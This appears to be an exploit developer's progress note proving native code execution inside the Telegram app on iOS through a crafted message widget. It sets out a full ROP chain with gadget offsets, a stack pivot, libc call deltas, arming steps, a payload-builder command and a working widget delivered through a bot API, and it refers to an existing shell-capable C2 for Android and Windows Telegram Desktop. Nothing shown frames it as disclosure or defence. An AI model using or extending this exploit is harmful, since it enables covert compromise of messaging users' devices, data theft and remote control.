# iOS 6s: RCE proof (2026-11-05)

Target: iPhone 6s, iOS 15.8.8, Telegram 13.2 build 36535, widget `message-widget.0`.
Status: **native code execution proven inside the Telegram process; app alive.**

## Result

`/private/var/mobile/Containers/Data/Application/00000000-0000-0000-0000-000000000000/Documents/rce.txt`

```
-rw------- 1 mobile mobile 7 Nov  5 21:27
RCE_OK
52 43 45 5f 4f 4b 0a
```

Created by the widget ROP chain (`open` + `write`), not by SSH. The Telegram
process (PID 69173) stayed alive; no crash report. The file mode was `0000`
(O_CREAT on a pre-existing zero-mode file); content is the proof.

## Chain

1. #1827 primitive gives arbitrary R/W (`js_free` = TelegramUIFramework+0x3f4f174).
2. Pivot: `rt->mf.js_malloc_usable_size` (rt+0x20) = **JavaScriptCore+0x3a0ee8**:
   `mov sp,x0 ; ret`. `js_free_rt` calls it with `x0 = block header`
   (= user_data-8, 16-byte aligned), so SP is aligned; the gadget returns to
   the `js_free_rt` continuation, which loads x19/x20/x21/x22/x30 and SP from
   the freed block (TRIG user data).
   Runtime address: `PIVOT2 = libcFree - 0x66cccfc` (JSC base - free).
3. js_free_rt tail branches to `rt->mf.js_free` (rt+0x10) = call gadget
   TelegramUIFramework+0x3292c.
4. Gadgets:
   - `G_CALL`  0x3292c: `blr x21; ldp x29,x30,[sp,#0xa0]; ldp x20,x19,[sp,#0x90]; ldp x22,x21,[sp,#0x80]; add sp,sp,#0xb0; ret`
   - `G_LOAD`  0x172d96c: `ldp x1,x2,[x20,#0x10]; ldp x3,x4,[x20,#0x20]; ldr x5,[x20,#0x30]; ret`
   - `G_X0`    0x628a2c: `ldr x0,[x22,#0x28]; blr x19; ldp x29,x30,[sp,#0x20]; ldp x20,x19,[sp,#0x10]; ldp x22,x21,[sp],#0x30; ret`
5. Safe data: a fresh `Uint8Array(2048)` is leaked by scanning ±64 KiB around
   D for a JSArrayBuffer struct with `byte_length == 2048` and a magic at
   data+0x400. Path/structs/pointers live in that **large** block, not in the
   JS class-80 arena, so no JSString/JSObject corruption.
6. Calls (deltas from libc `free`):
   - `open`  +0x296b394c, `write` +0x296b3738, `pthread_exit` +0x4a21a474.
7. Critical ordering: precompute `rt+0x10/0x20/0x30/0x40`, `PIVOT2` and the
   huge `malloc_size` BigInt **before** arming. After writing
   `rt+0x30 = 0xffffffffffffffff`, no BigInt arithmetic/allocation is allowed
   (an inline `rt + 64n` allocates and aborts in `js_free_rt`).
8. Arm: `rt+0x10=G_CALL`, `rt+0x40=0`, `rt+0x30=huge`, `rt+0x20=PIVOT2`,
   drop the TRIG alias, `TRIG=null` → pivot → chain → `pthread_exit(0)`.

## Artifacts

- Endgame: `lab/ios_port/ios_rop_u_endgame.js`
- Builder: `python3 lab/ios_port/make_ios_payload.py --android-payload /tmp/opencode/ios_rop_src.js --endgame lab/ios_port/ios_rop_u_endgame.js --js-def-free 0x3f4f174 --stub-printf 0x557bc20 --stub-fflush 0x557af30 --min-cfg --cmd '' --minify ...`
- Working widget: `/tmp/opencode/ios_widget_u3.html` (8,442 B raw, 3,848 B zlib9), bot API message 5655.

## Limitation

iOS app sandbox denies `fork`/`posix_spawn`/`execve` (EPERM even for `/bin/sh`
and `/bin/df`). The exploit can call arbitrary existing libc functions
in-process (open/read/write/mmap RW, socket/connect/... eventually), but it
cannot start `/bin/sh` or any process. A shell-style C2 is therefore not
reachable on this target without a sandbox bypass; the Android/Windows
Telegram Desktop C2 remains the interactive-shell path.
